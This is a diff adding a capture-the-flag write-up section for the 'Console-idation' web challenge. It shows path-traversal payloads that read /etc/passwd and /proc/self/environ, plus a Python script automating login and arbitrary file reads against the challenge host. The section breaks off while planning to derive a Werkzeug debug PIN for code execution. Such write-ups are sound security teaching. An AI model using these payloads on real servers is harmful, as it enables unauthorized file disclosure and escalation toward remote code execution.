@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/4a73e719-ec89-4707-be93-c1a40ac9fd9f)<h3> Perfectroot CTF 2024 </h3>
+<h3> Perfectroot CTF 2024 </h3>
 
 ![image](https://github.com/user-attachments/assets/b55b9b6d-8b2c-429a-bd9f-b2542a787953)
 
@@ -1629,7 +1629,119 @@ To get the flag, we simply just execute the binary
 Flag: r00t{p4tch_th3_bin_and_h4ve_fun}
 ```
 
+### Web 1/5 :~
 
+#### Console-idation
+![image](https://github.com/user-attachments/assets/c24de159-ef49-4aed-998b-64e6114a6798)
+
+Going over to the url provided shows this
+![image](https://github.com/user-attachments/assets/de9fc184-e726-472a-96c7-14ecbef3fee2)
+
+I tried stuffs like sql injection but it didn't work so i created an account
+
+After login in i saw this
+![image](https://github.com/user-attachments/assets/d9377dc5-7dc3-4096-92ce-2c6894ba7c8a)
+
+Seems we can read another poem and on doing that i noticed the url
+![image](https://github.com/user-attachments/assets/ffaaa0df-4b8e-4d83-9bf0-86f860448834)
+
+It looks like it's directly getting the poem from `/` and with this i decided to play around with local file inclusion
+
+After some time trying some payload this worked for me:
+![image](https://github.com/user-attachments/assets/b7339337-506d-487a-b1f3-e12394757caa)
+
+```
+http://94.72.112.248:10011/dashboard?file=....//....//....//....//etc/passwd
+```
+
+Ok now what?
+
+The web app is a python based server but uses nginx as the reverse proxy
+
+How did i figure that out?
+
+Simply by reading the environment variable
+![image](https://github.com/user-attachments/assets/e484ef41-abc0-4724-90af-c69f7492805a)
+
+```
+http://94.72.112.248:10011/dashboard?file=....//....//....//....//proc/self/environ
+```
+
+Now we know that it's a werkzeug server and one thing you might try here is maybe reading the flag?
+
+But that's not possible because i read the cmdline file and saw this
+![image](https://github.com/user-attachments/assets/122f87eb-9d0d-4672-954b-84653f3cd74c)
+
+So that executes `/start.sh` and on reading that i got this
+![image](https://github.com/user-attachments/assets/dfc5f947-c67d-4e43-9b79-cd79cdf7b992)
+
+```sh
+#!/bin/sh
+
+#secure start chmod 600 /start.sh
+mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
+
+# Start your Flask app
+nginx -g "daemon off;" & python3 /app/main.py
+```
+
+The flag name was randomly generated so that means we need to know it before reading it
+
+This means we need to get RCE
+
+One thing you should note is that the session expires after few minutes which can be annoying but i wrote a script that makes it easier to interact with the arbitrary file read
+
+```python
+import requests
+from bs4 import BeautifulSoup
+
+base_url = "http://94.72.112.248:10011"
+login_endpoint = "/login"
+dashboard_endpoint = "/dashboard?file=....//....//....//"
+
+login_data = {
+    "email": "a@a.com",
+    "password": "a"
+}
+
+def main():
+    while True:
+        query = input("> ")
+        if query != "q":
+            with requests.Session() as session:
+                login_url = f"{base_url}{login_endpoint}"
+                login_response = session.post(login_url, data=login_data)
+                
+                query = query.replace("/", "%2f")
+                dashboard_url = f"{base_url}{dashboard_endpoint}{query}"
+                dashboard_response = session.get(dashboard_url)
+                soup = BeautifulSoup(dashboard_response.text, "html.parser")
+                content = soup.find_all("p")[1]
+                print(content.get_text())
+        else:
+            quit()
+
+if __name__ == "__main__":
+    main()
+```
+
+We can confirm it works!
+![image](https://github.com/user-attachments/assets/ceb15191-8986-4427-b7a2-6a0a296d59f7)
+
+Now how do we get RCE?
+
+I wanted to actually read the application source code which is located at `/app/main.py` but it didn't allow me
+
+But because we know it's a wergzeug server and the challenge name is `console-idation` we can assume that it's running in debug mode
+
+To confirm that we can try access `/console`
+![image](https://github.com/user-attachments/assets/3a26eaad-2221-4d77-ab71-1198d94a6722)
+
+At this point it's clear on what we should do
+
+Basically we need to leverage the file read to generate the debug pin
+
+You can read more on it [here]()
 
 
 
